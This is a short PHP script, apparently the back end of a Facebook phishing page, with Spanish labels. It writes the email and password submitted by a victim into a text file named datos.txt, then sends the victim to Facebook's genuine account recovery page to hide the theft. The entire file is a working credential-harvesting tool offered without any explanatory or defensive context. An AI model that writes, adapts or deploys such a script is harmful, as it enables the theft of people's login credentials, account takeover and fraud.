<?php

file_put_contents("datos.txt", "usuario: " . $_POST['email'] . " contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>